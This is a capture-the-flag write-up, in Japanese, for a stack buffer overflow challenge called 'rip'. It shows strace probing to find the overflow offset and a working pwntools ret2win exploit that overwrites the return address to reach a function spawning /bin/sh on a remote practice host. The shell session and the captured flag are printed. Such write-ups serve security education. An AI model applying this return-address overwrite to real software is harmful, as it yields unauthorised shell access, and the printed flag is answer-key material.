# rip

## solution

straceで、Aが何個目でスタックフレームのrbp前まで影響あるかを調べると23個でした（25: 4141, 24: 41）。

```bash
$ python3 -c 'print("A"*25)' | strace -i ./pwn1
[00007f4bad004141] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f4bad004141} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
$ python3 -c 'print("A"*24)' | strace -i ./pwn1
[00007f8631ad0041] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x7f8631ad0041} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
$ python3 -c 'print("A"*23)' | strace -i ./pwn1
[00007f5ba50bb7e0] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x7f5ba50bb7e0} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```

8byteでアラインメントするために、今回はROP.find_gadgetによって'ret'命令のアドレスを取得しました。

また、`fun()` で/bin/shを起動しているので、リターンアドレスでfunのアドレスを格納します。

```python
from pwn import *

binfile = "./pwn1"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

fun = elf.symbols['fun']
HOST='node4.buuoj.cn'
PORT=26978

# conn = process(binfile)
conn = remote(HOST, PORT)
sleep(1)

# padding + ret(8byte, allignment) + fun(=/bin/sh)
payload = b'a' * 23 + p64(ret) + p64(fun)

conn.sendline(payload)
conn.interactive()
```


```
% python3 solver.py
[*] '/pwn/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loaded 14 cached gadgets for './pwn1'
Gadget(0x4011fb, ['pop rdi', 'ret'], ['rdi'], 0x10)
[+] Opening connection to node4.buuoj.cn on port 26978: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
flag{75d68026-2e80-40f9-b39a-1ac44efb32dc}
```


## FLAG

```
flag{75d68026-2e80-40f9-b39a-1ac44efb32dc}
```
